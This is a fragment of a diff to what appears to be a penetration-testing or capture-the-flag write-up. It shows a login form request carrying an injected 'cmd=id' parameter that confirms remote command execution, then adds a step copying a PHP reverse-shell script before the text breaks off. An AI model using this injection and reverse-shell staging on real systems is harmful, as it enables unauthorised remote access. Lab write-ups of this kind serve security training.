@@ -70,7 +70,8 @@ try execute id `name=admin&username=admin&password=admin&access=access&cmd=id`
 
 
 code was executed. Now run reverse shell
-
+`cp /usr/share/webshells/php/php-reverse-shell.php .`
+Change 
 
 
 
